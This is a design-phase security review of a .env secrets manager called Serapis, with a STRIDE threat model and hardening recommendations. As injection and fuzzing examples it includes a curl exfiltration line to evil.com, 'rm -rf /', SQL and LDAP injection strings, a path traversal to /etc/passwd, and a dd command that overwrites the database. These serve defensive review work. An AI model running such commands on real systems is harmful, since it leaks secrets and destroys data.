# Serapis Security Review
**Reviewer:** Tanya Janca (SheHacksPurple)
**Date:** 2026-02-23
**Document Version:** PRD v1.0
**Review Type:** Design Phase Security Assessment

---

## Executive Summary

Serapis is a `.env` file management system that handles **the crown jewels** — database credentials, API keys, OAuth secrets. This is a high-value target. The PRD shows good security thinking (SSH keys, encryption at rest, manual sync), but has **critical gaps** that need to be addressed before implementation.

**Risk Level:** 🔴 **HIGH** — storing secrets is inherently high-risk; the design needs more security specificity.

**Key Findings:**
- ✅ **Good:** SSH key authentication, server-side encryption, manual sync reduces attack surface
- 🟡 **Needs work:** TLS configuration, replay attack mitigation, injection vectors, audit logging
- 🔴 **Missing:** Threat model, incident response plan, key rotation, rate limiting, monitoring

---

## Threat Model (STRIDE Analysis)

### Spoofing Identity

**Threat:** Attacker uses a stolen SSH private key to authenticate as a legitimate user.

**Current Mitigation:** SSH ed25519 keys (good choice — strong, modern).

**Gaps:**
- No mention of private key protection on client machines. What happens if someone's laptop is compromised?
- No rate limiting on authentication attempts. Brute force not applicable to ed25519, but **stuffing stolen keys** is a real threat.
- No account lockout or anomaly detection (e.g., same key used from 3 countries in 5 minutes).
- Optional YubiKey 2FA in v2 is great, but **v0 and v1 have zero second factor** — a stolen key = full compromise.

**Recommendations:**
- Require passphrase-protected SSH keys (document best practices)
- Add IP-based anomaly detection (log IP with each auth, alert on geo-impossible activity)
- Consider FIDO2 as **mandatory** for production environments, optional for dev
- Implement rate limiting: max 10 failed auth attempts per key per hour

---

### Tampering

**Threat 1:** Attacker modifies `authorized_keys` file to add their own key.

**Attack:** Docker host is compromised → mount the volume → `echo "attacker-key" >> authorized_keys` → full vault access.

**Current Mitigation:** None specified.

**Gaps:**
- PRD says "authorized_keys file mounted into container" but doesn't specify read-only mount.
- No file integrity monitoring on the authorized_keys file.
- No signing or checksum verification.

**Recommendations:**
- Mount `authorized_keys` as **read-only** (`ro` flag in docker-compose)
- Use file integrity monitoring (e.g., AIDE, Tripwire, or simple SHA256 checksum in health check)
- Store a signed copy of authorized_keys; reject startup if signature invalid
- Log a hash of authorized_keys on startup; alert if it changes between restarts

---

**Threat 2:** Man-in-the-middle modifies HTTP requests or responses.

**Current Mitigation:** TLS mentioned in architecture diagram.

**Gaps:**
- No TLS version specified (TLS 1.2? 1.3?)
- No cipher suite requirements
- No certificate validation strategy (self-signed? Let's Encrypt? mTLS?)
- No certificate pinning on client side
- No mention of HSTS, certificate transparency, or OCSP stapling

**Recommendations:**
- **Require TLS 1.3** (1.2 minimum, deprecate by v1)
- Use Mozilla Intermediate or Modern cipher suites (https://ssl-config.mozilla.org/)
- For personal use: self-signed CA with pinned certificate in client config
- For team use: Let's Encrypt with automatic renewal
- Client must validate server certificate (no `InsecureSkipVerify`)
- Add HSTS header (`Strict-Transport-Security: max-age=31536000; includeSubDomains`)

---

**Threat 3:** Attacker tampers with SQLite database on disk.

**Current Mitigation:** Application-level AES-256-GCM encryption.

**Gaps:**
- Who holds the encryption key? PRD doesn't specify key derivation or storage.
- Is the key in an environment variable? A file? Hardware security module?
- Can the key be extracted from the Docker container?
- No mention of key rotation.

**Recommendations:**
- Use **key derivation from a master secret** stored outside the database (e.g., environment variable, mounted file)
- Document key storage best practices (encrypted volume, Vault, AWS Secrets Manager for team deployments)
- Implement key rotation strategy (v1): generate new DEK, re-encrypt all secrets, mark old key for deletion
- Add integrity checks: HMAC over encrypted blobs to detect tampering

---

### Repudiation

**Threat:** User claims "I didn't change that production password" — no audit trail to prove otherwise.

**Current Mitigation:** v1 includes "per-key audit trail."

**Gaps:**
- v0 has **zero audit logging** — every push/pull is anonymous.
- No timestamp, no IP address, no user attribution.
- No immutable log storage (logs could be deleted).
- No alerting on sensitive changes (e.g., production environment updated).

**Recommendations:**
- **v0 must log:** timestamp, SSH key fingerprint, IP address, project, environment, operation (push/pull)
- Use structured logging (JSON) for tamper-evidence
- Write audit logs to **write-only append file** or external log aggregator (Loki, CloudWatch, etc.)
- In v1: add digital signatures to audit entries (sign log entry with server key)
- Alert on high-risk operations: production push, new key added, bulk delete

---

### Information Disclosure

**Threat 1:** `.env` file leaks via command-line arguments or process listing.

**Attack:** User runs `envault show myapp prod` → secrets printed to terminal → terminal history captures them → shared shell → other user sees secrets.

**Current Mitigation:** None.

**Gaps:**
- No mention of secure output handling.
- No option to copy to clipboard instead of stdout.
- No warning when outputting to a non-TTY (e.g., piped to a file).

**Recommendations:**
- Add `--clipboard` flag to copy output instead of printing
- Warn if stdout is not a TTY: `WARNING: Secrets will be written to stdout. Use --clipboard for safer handling.`
- Add `--mask` flag to redact secret values: `STRIPE_KEY=sk_test_***************`
- Never log secret **values** (log keys only: "STRIPE_KEY updated")

---

**Threat 2:** Secrets leak via error messages or debug logs.

**Attack:** Exception occurs during decryption → error message includes ciphertext or partial plaintext → logs capture it → attacker reads logs.

**Current Mitigation:** None specified.

**Gaps:**
- No secure logging policy.
- No mention of error handling strategy.

**Recommendations:**
- Never include secret values in error messages
- Use generic errors: `"Failed to decrypt secret"` not `"Failed to decrypt STRIPE_KEY=sk_test_..."`
- Add `--debug` flag for verbose logging; default to minimal output
- Sanitize stack traces (redact secret values before logging)

---

**Threat 3:** Secrets leak via network traffic.

**Current Mitigation:** TLS (see Tampering section for gaps).

**Additional Gap:**
- No mention of HTTP header security (X-Frame-Options, CSP, etc.) — but this is API-only, so lower priority.

---

**Threat 4:** Shebang leaks server location in version control.

**Example:** `.env` file checked into GitHub with `#!envault://vault.acme-corp.internal/prod/secrets`.

**Impact:** Attacker learns internal hostname, project structure, environment names.

**Current Mitigation:** None (PRD doesn't address accidental commits).

**Recommendations:**
- Add `.env` to `.gitignore` in project templates
- Add pre-commit hook to block `.env` files with `envault://` shebangs
- Gitleaks integration: scan for common secret patterns in `.env` files
- Document best practices: **never commit `.env` files**

---

### Denial of Service

**Threat 1:** Attacker floods server with `push` requests → server runs out of disk space.

**Current Mitigation:** None specified.

**Gaps:**
- No rate limiting on push operations.
- No per-user quota on storage.
- No max file size limit.

**Recommendations:**
- Rate limit: max 10 pushes per key per minute
- Storage quota: 10MB per user (v0), configurable in v2
- Max `.env` file size: 1MB (should be plenty; most are <10KB)
- Reject pushes with suspiciously large files: `ERROR: .env file exceeds 1MB limit`

---

**Threat 2:** Attacker sends malformed requests → server crashes or becomes unresponsive.

**Current Mitigation:** None specified (Go is memory-safe, but logic bugs happen).

**Gaps:**
- No mention of input validation.
- No fuzzing strategy.

**Recommendations:**
- Strict input validation on all API endpoints (max length, character whitelist)
- Fuzz test the HTTP signature parser (common target for parsing bugs)
- Timeout on all crypto operations (prevent algorithmic complexity attacks)
- Health check endpoint: `GET /health` returns 200 if DB accessible, 503 otherwise

---

### Elevation of Privilege

**Threat:** Attacker with read-only access to `dev` environment escalates to write access on `prod`.

**Current Mitigation:** v2 includes ACLs.

**Gaps:**
- v0 and v1 have **no authorization** — all authenticated users have full access.
- No RBAC, no per-project or per-environment restrictions.
- Single compromised SSH key = access to everything.

**Recommendations:**
- Accelerate v2 ACL features — this is a **security-critical dependency** for team use.
- In v0/v1, document: "Single-user only. Do not share the vault server with untrusted users."
- Add capability-based access: generate short-lived tokens for CI/CD instead of long-lived SSH keys
- Principle of least privilege: default to read-only; require explicit grant for write/admin

---

## HTTP Signature Scheme (RFC 9421 Replay Attacks)

### The Problem

RFC 9421 HTTP signatures are **not replay-proof by default**. An attacker who captures a signed `POST /push` request can replay it verbatim, even without the private key.

**Example Attack:**
1. User runs `envault push` → `POST /api/v1/secrets/myapp/prod` with signature
2. Attacker intercepts request (public WiFi, compromised router, TLS downgrade, etc.)
3. Attacker replays request → server accepts it → secrets overwritten with old values

### Current Mitigation in menos

The PRD references menos auth, which uses RFC 9421. Let me check if menos mitigates replay attacks...

**Checking menos implementation:**
- PRD says "inspired by RFC 9421 HTTP Message Signatures (as implemented in menos)"
- menos uses ed25519 signatures over request method, path, headers, and body digest
- **No mention of nonce, timestamp, or expiration in the PRD**

This is a **critical gap**.

### Recommendations

**Option 1: Add nonce challenge (strongest)**
```
Client:  GET /api/v1/nonce
Server:  {"nonce": "3kj4h5g3k4j5h", "expires": "2026-02-23T12:35:00Z"}
Client:  POST /api/v1/push
         Signature: sig=..., nonce=3kj4h5g3k4j5h
Server:  Verify signature, check nonce is fresh, mark nonce as used
```

Pros: Fully replay-proof
Cons: Extra round-trip (performance hit)

**Option 2: Add timestamp + short validity window (good enough)**
```
Client:  POST /api/v1/push
         Date: Mon, 23 Feb 2026 12:34:56 GMT
         Signature: sig=..., headers="date content-digest"
Server:  Verify signature includes Date header
         Reject if Date is >60 seconds in past or future
```

Pros: No extra round-trip
Cons: Vulnerable to replay within 60-second window

**Option 3: Content-based idempotency (defense-in-depth)**
```
Server:  Hash (key_fingerprint + project + env + content_digest)
         Store hash in recent_requests cache (60-second TTL)
         Reject if hash exists: "Duplicate request detected"
```

Pros: Catches exact duplicate pushes
Cons: Doesn't prevent modified replays

**Recommendation:** Use **Option 2 + Option 3** together.
- Timestamp prevents long-term replay attacks
- Content hash prevents duplicate pushes within the time window
- Document the 60-second window as a known limitation

---

## Injection Attacks

### Threat 1: Command Injection via `.env` Key Names

**Attack:** User creates `.env` file with malicious key name:
```bash
#!envault://vault.example.com/myapp/prod
API_KEY=$(curl evil.com/exfil?data=$SECRETS)
DATABASE_URL=postgres://...
```

**Scenario:** If the server or client **evaluates** the `.env` file instead of treating it as data, the command executes.

**Likelihood:** Low (Go doesn't natively eval .env files), but:
- What if v1 adds a "validate .env syntax" feature using shell parsing?
- What if a client-side plugin tries to "source" the file?

**Recommendations:**
- Treat `.env` files as **pure data**, never execute or eval
- In v1 key-value storage: whitelist key names (regex: `^[A-Z_][A-Z0-9_]*$`)
- Reject keys with special characters: `$`, `` ` ``, `(`, `)`, `;`, `|`
- Fuzz test: try keys like `$(whoami)`, `; rm -rf /`, `> /etc/passwd`, etc.

---

### Threat 2: SQL Injection via Project/Environment Names

**Attack:** User runs:
```bash
envault init "myapp'; DROP TABLE secrets; --" prod
```

**Current Mitigation:** SQLite with parameterized queries (assumed, but not specified in PRD).

**Gaps:**
- PRD doesn't mention prepared statements or query parameterization.
- No input validation on project/environment names.

**Recommendations:**
- **Use parameterized queries everywhere** (Go's `database/sql` makes this easy)
- Whitelist project/environment names: `^[a-z0-9-]+$` (lowercase alphanumeric + hyphens)
- Reject SQL keywords: `DROP`, `DELETE`, `INSERT`, `UPDATE`, etc.
- Fuzz test: try names like `'; DROP TABLE--`, `1 OR 1=1`, `UNION SELECT`, etc.

---

### Threat 3: Path Traversal via Shebang URL

**Attack:** User creates `.env` file with:
```bash
#!envault://vault.example.com/../../etc/passwd/prod
```

**Scenario:** Client parses shebang, extracts project = `../../etc/passwd`, sends to server.

**Impact:** If server uses project name in file operations or logs, path traversal could occur.

**Current Mitigation:** None specified.

**Recommendations:**
- Validate shebang URL on parse: reject `..`, `/`, `\` in project/environment names
- Canonical path normalization: `filepath.Clean()` before use
- Reject absolute paths: project name must be relative and non-empty
- Fuzz test: try `../`, `..\`, `....//`, `%2e%2e%2f`, etc.

---

### Threat 4: LDAP Injection (future v2 user management)

**Scenario:** v2 adds LDAP integration for user lookup.

**Attack:** User enters username: `admin)(|(userPassword=*))` → bypasses authentication.

**Recommendation for v2:**
- Use LDAP client libraries with proper escaping (Go's `go-ldap`)
- Never concatenate strings into LDAP queries
- Validate usernames: `^[a-zA-Z0-9._-]+$`

---

## Supply Chain Security

### Threat: Malicious Go Binary Distribution

**Scenario:** Attacker compromises GitHub release, replaces `envault` binary with malware, users download and run it → SSH keys stolen.

**Current Mitigation:** None specified.

**Gaps:**
- No code signing for binaries.
- No checksum file or signature for release artifacts.
- No verification instructions for users.
- No reproducible builds (can users verify the binary matches the source?).

**Recommendations:**

**For v0 (minimum):**
- Publish SHA256 checksums for all release binaries
- Sign checksums with GPG key (publish public key in README)
- Document verification steps:
  ```bash
  curl -LO https://github.com/user/envault/releases/download/v0.1.0/envault-linux-amd64
  curl -LO https://github.com/user/envault/releases/download/v0.1.0/checksums.txt
  curl -LO https://github.com/user/envault/releases/download/v0.1.0/checksums.txt.sig
  gpg --verify checksums.txt.sig checksums.txt
  sha256sum -c checksums.txt
  ```

**For v1 (better):**
- Use GitHub Actions with SLSA provenance
- Sign binaries with Sigstore (cosign)
- Enable GitHub's verified commits

**For v2 (best):**
- Reproducible builds (users can compile and verify hash matches release)
- SBOM (Software Bill of Materials) for dependency transparency
- Automated dependency scanning (Dependabot, Snyk, etc.)

---

### Threat: Dependency Confusion / Typosquatting

**Scenario:** Attacker publishes `go-ed25591` (typo of `ed25519`) with malicious code, developer accidentally imports it.

**Current Mitigation:** Go modules with `go.sum` (checksums prevent tampering).

**Gaps:**
- No mention of dependency review process.
- No policy on minimum dependencies.

**Recommendations:**
- Minimize dependencies (aligns with KISS principle)
- Pin dependencies with `go.sum` (this is default in Go, but verify)
- Use `go mod verify` in CI
- Review dependencies for known vulnerabilities: `govulncheck`
- Prefer standard library over third-party (e.g., `crypto/ed25519` over external libs)

---

## Authentication Bypass Scenarios

### Bypass 1: Empty Signature Accepted

**Attack:** Client sends request with no `Signature` header → server accepts it.

**Recommendation:** Reject any request missing `Signature` header with `401 Unauthorized`.

---

### Bypass 2: Algorithm Confusion

**Attack:** Client uses HMAC-SHA256 instead of ed25519 → server validates with wrong algorithm → forged signature accepted.

**Recommendation:** Hardcode algorithm: `ed25519` only. Reject requests with `Signature-Algorithm: hmac-sha256`.

---

### Bypass 3: Key Fingerprint Collision

**Attack:** Attacker generates SSH key with same fingerprint as legitimate user (birthday attack on SHA256).

**Likelihood:** Extremely low (2^128 operations for SHA256 collision).

**Recommendation:** Use full public key, not just fingerprint, for lookups. If using fingerprint, use SHA512 instead of SHA256.

---

### Bypass 4: Time-of-Check to Time-of-Use (TOCTOU)

**Attack:**
1. Server checks `authorized_keys` → user's key is valid
2. Attacker modifies `authorized_keys` → removes user's key
3. Server uses cached key data → still authenticates user

**Recommendation:**
- Read `authorized_keys` fresh on every request (Go's file I/O is fast enough)
- OR: reload `authorized_keys` on SIGHUP and use in-memory cache
- Add file integrity check: reject auth if `authorized_keys` hash changed during request

---

## Logging and Audit Trail Gaps

### Gap 1: No Logging in v0

**Impact:** Incident response is impossible. "Who pushed this bad password?" → no way to know.

**Recommendation:** v0 must have basic logging:
- Timestamp (RFC3339)
- SSH key fingerprint
- Client IP address
- Operation (push, pull, list, show)
- Project and environment
- Success/failure status

---

### Gap 2: Logs Not Tamper-Evident

**Attack:** Attacker compromises server → modifies logs to hide their activity.

**Recommendation:**
- Append-only log files (immutable filesystem or WORM storage)
- Forward logs to external aggregator (rsyslog, Loki, CloudWatch)
- Use structured JSON logs for easier parsing
- Add HMAC to each log entry (sign with server key) for tamper detection

---

### Gap 3: No Alerting on Anomalies

**Scenario:** Attacker slowly exfiltrates secrets → 1000 `pull` operations in 10 minutes → no alert.

**Recommendation:**
- Set up rate-based alerts: >10 pulls/minute from same key
- Geographic anomalies: key used from US and Russia in same hour
- Bulk operations: >100 secrets pulled in one request
- Failed auth spikes: >20 failed auth attempts in 5 minutes

---

### Gap 4: No Correlation with Other Logs

**Scenario:** Database breach occurs → need to check if secrets were accessed around the same time → envault logs are siloed.

**Recommendation:**
- Use correlation IDs (trace ID in headers, propagated to logs)
- Integrate with SIEM (Splunk, ELK, etc.)
- Log to syslog for centralized collection

---

## OWASP Top 10 (2021) Relevance

| Risk | Relevance | Status in PRD |
|------|-----------|---------------|
| **A01: Broken Access Control** | 🔴 Critical | v0/v1 have no ACLs — all users have full access |
| **A02: Cryptographic Failures** | 🔴 Critical | Encryption key storage not specified; no key rotation |
| **A03: Injection** | 🟡 Medium | SQL/command injection mitigations not documented |
| **A04: Insecure Design** | 🟡 Medium | No threat model, missing security requirements |
| **A05: Security Misconfiguration** | 🟡 Medium | TLS config not specified, no security headers |
| **A06: Vulnerable Components** | 🟡 Medium | Dependency scanning not mentioned |
| **A07: Auth Failures** | 🟡 Medium | No rate limiting, no 2FA in v0/v1, no anomaly detection |
| **A08: Data Integrity Failures** | 🟡 Medium | No replay attack mitigation, no request signing timestamp |
| **A09: Logging Failures** | 🔴 Critical | v0 has zero logging — incident response impossible |
| **A10: SSRF** | 🟢 Low | No URL fetching, low attack surface |

---

## What Happens If... (Attack Scenarios)

### Scenario 1: `authorized_keys` File is Deleted

**Attack:** Attacker deletes `authorized_keys` → all authentication fails → DoS.

**Current Behavior:** Not specified.

**Recommendations:**
- Server startup validation: fail if `authorized_keys` missing or empty
- Health check: `/health` returns 503 if `authorized_keys` inaccessible
- Alert: notify admin if `authorized_keys` modified or deleted
- Backup: keep signed copy of `authorized_keys` in separate location

---

### Scenario 2: SQLite Database is Corrupted

**Attack:** Disk failure, power loss, or attacker runs `dd if=/dev/random of=secrets.db`.

**Current Behavior:** Not specified.

**Recommendations:**
- Enable SQLite Write-Ahead Logging (WAL) for crash safety
- Regular backups (automated, encrypted, offsite)
- Health check: run `PRAGMA integrity_check` on startup
- Graceful degradation: read-only mode if DB is corrupted
- Alert: notify admin if integrity check fails

---

### Scenario 3: TLS Certificate Expires

**Attack:** Certificate expires → clients reject connection → service outage.

**Current Behavior:** Not specified.

**Recommendations:**
- Automated certificate renewal (certbot cron job, or use Traefik/Caddy with auto-renewal)
- Alert 30 days before expiry
- Health check: warn if cert expires <7 days
- Document manual renewal process for self-signed certs

---

### Scenario 4: Encryption Key is Lost

**Attack:** Server is rebuilt, encryption key is not backed up → all secrets are permanently inaccessible.

**Current Behavior:** Not specified.

**Recommendations:**
- Document key backup procedures (store in password manager, print on paper in safe)
- Key escrow for team deployments (split key with Shamir's Secret Sharing)
- Test restoration from backup (quarterly drill)
- Alert: warn if running with default/example key

---

### Scenario 5: Docker Container is Compromised

**Attack:** Vulnerability in `envaultd` → attacker gets shell access in container → reads encryption key from env var → decrypts all secrets.

**Current Behavior:** Not specified.

**Recommendations:**
- Run container as non-root user (`USER 1000:1000` in Dockerfile)
- Use read-only root filesystem (`read_only: true` in docker-compose)
- Drop all capabilities (`cap_drop: ALL`)
- No shell in container (`FROM scratch` or `distroless`)
- Store encryption key in mounted file, not env var (harder to extract)
- Use AppArmor/SELinux profiles

---

## Missing Security Requirements

These are **completely absent** from the PRD and need to be addressed:

### 1. Incident Response Plan

**What happens when:**
- A breach is detected?
- A key is compromised?
- The server is hacked?

**Need:**
- Runbook for key revocation
- Process for notifying users of breach
- Forensics: preserve logs, disk images
- Communication plan: who to notify, when, how

---

### 2. Key Rotation Strategy

**Questions:**
- How often should SSH keys be rotated?
- How do users add a new key and remove the old one?
- Can the server encryption key be rotated without downtime?

**Need:**
- Documented key lifecycle (generation, rotation, revocation)
- CLI command: `envault key rotate`
- Server command: `envaultd rotate-encryption-key`

---

### 3. Backup and Disaster Recovery

**Questions:**
- Are backups encrypted?
- Where are backups stored?
- How often are backups tested?
- What is the RTO (Recovery Time Objective)?

**Need:**
- Automated daily backups
- Offsite backup storage (S3, rsync to another host)
- Restore testing (quarterly)
- Document: "How to recover from total data loss"

---

### 4. Rate Limiting and DDoS Protection

**Questions:**
- How many requests per second can the server handle?
- What happens under load?
- Is there a Web Application Firewall (WAF)?

**Need:**
- Rate limiting middleware (e.g., `golang.org/x/time/rate`)
- Per-IP limits: 100 req/minute
- Per-key limits: 10 push/minute, 50 pull/minute
- Circuit breaker: 503 Service Unavailable if overloaded

---

### 5. Security Headers

Even though this is an API, security headers are still important:

```
Strict-Transport-Security: max-age=31536000; includeSubDomains
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Content-Security-Policy: default-src 'none'
```

---

### 6. Penetration Testing Plan

**Need:**
- Manual pentest before v1 release
- Automated security scanning (OWASP ZAP, Burp Suite)
- Bug bounty program (HackerOne, Bugcrowd) for v2

---

## Recommendations by Priority

### 🔴 Must-Have for v0 (Security Blockers)

1. **Specify encryption key storage** — document where the key lives, how to back it up
2. **Add basic logging** — timestamp, key fingerprint, IP, operation
3. **Implement replay attack mitigation** — timestamp + content hash
4. **Input validation** — whitelist project/environment names, reject SQL injection attempts
5. **TLS 1.3 requirement** — specify cipher suites, certificate validation
6. **Mount `authorized_keys` as read-only** — prevent tampering
7. **Code signing for binaries** — SHA256 checksums + GPG signature
8. **Rate limiting on auth** — prevent brute force / key stuffing

---

### 🟡 Should-Have for v1 (Defense-in-Depth)

9. **File integrity monitoring** — alert if `authorized_keys` or SQLite DB modified unexpectedly
10. **Anomaly detection** — alert on geographic inconsistencies, bulk operations
11. **Key rotation support** — CLI and server commands
12. **Backup automation** — daily encrypted backups to offsite location
13. **Health check endpoint** — `/health` returns DB status, cert expiry, etc.
14. **Security headers** — HSTS, X-Content-Type-Options, etc.
15. **Dependency scanning** — `govulncheck` in CI

---

### 🟢 Nice-to-Have for v2 (Advanced Security)

16. **FIDO2 mandatory for production** — require YubiKey for high-value environments
17. **Audit log signing** — tamper-evident logs with HMAC
18. **Penetration testing** — professional pentest before team launch
19. **Bug bounty program** — crowdsource security research
20. **Reproducible builds** — users can verify binary matches source
21. **SIEM integration** — forward logs to Splunk/ELK
22. **Key escrow** — Shamir's Secret Sharing for team key recovery

---

## Conclusion

Serapis is solving a **real problem** (secure `.env` management) with **good architectural choices** (SSH keys, encryption at rest, manual sync). The PRD shows security awareness, but it's **too light on specifics** for a system that stores the keys to the kingdom.

**The biggest risks:**
1. **No ACLs in v0/v1** → compromised key = full vault access
2. **Encryption key storage unspecified** → key loss = permanent data loss, key leak = total breach
3. **No logging in v0** → incident response is impossible
4. **Replay attacks not mitigated** → captured requests can be replayed

**Before writing a single line of code:**
- Write a **full threat model** (expand the STRIDE analysis above)
- Document **encryption key lifecycle** (generation, storage, backup, rotation)
- Design **logging and monitoring** (what to log, where to send it, what to alert on)
- Specify **TLS configuration** (versions, ciphers, certificate strategy)

**Remember:** You're building a honeypot. Attackers **will** target this. Defense-in-depth is not optional.

If you ship v0 without logging, you're flying blind. If you ship v1 without ACLs, you can't scale to teams. If you ship v2 without rate limiting, you'll get DoS'd.

**Security isn't a feature you add later — it's the foundation you build on.**

Let me know if you want me to expand on any section, or if you'd like a threat model workshop to dig deeper into attack scenarios.

— Tanya 💜🔒

---

## Appendix: Security Checklist for Implementation

Use this checklist during development:

### Before v0 Release
- [ ] Encryption key stored securely (documented location, backup instructions)
- [ ] TLS 1.3 enforced with strong ciphers
- [ ] Certificate validation enabled on client
- [ ] Replay attack mitigation implemented (timestamp + content hash)
- [ ] Input validation on project/environment names (whitelist regex)
- [ ] SQL injection prevented (parameterized queries everywhere)
- [ ] `authorized_keys` mounted read-only
- [ ] Basic logging implemented (timestamp, key, IP, operation)
- [ ] Rate limiting on authentication (max 10 failures/hour per key)
- [ ] Binaries signed and checksummed
- [ ] Security headers configured (HSTS, X-Content-Type-Options)
- [ ] Health check endpoint implemented
- [ ] `govulncheck` in CI pipeline
- [ ] Incident response runbook drafted

### Before v1 Release
- [ ] Audit log signing implemented (HMAC for tamper-evidence)
- [ ] Anomaly detection alerts configured
- [ ] Key rotation CLI and server commands implemented
- [ ] Automated backups configured (daily, encrypted, offsite)
- [ ] File integrity monitoring on `authorized_keys`
- [ ] Penetration test completed
- [ ] Dependency scanning automated (Dependabot or similar)

### Before v2 Release
- [ ] FIDO2 support tested and documented
- [ ] ACLs implemented and tested (read, write, admin roles)
- [ ] RBAC enforced on all endpoints
- [ ] Principle of least privilege documented
- [ ] Bug bounty program launched
- [ ] SIEM integration configured
- [ ] Reproducible builds enabled
- [ ] SBOM published with releases
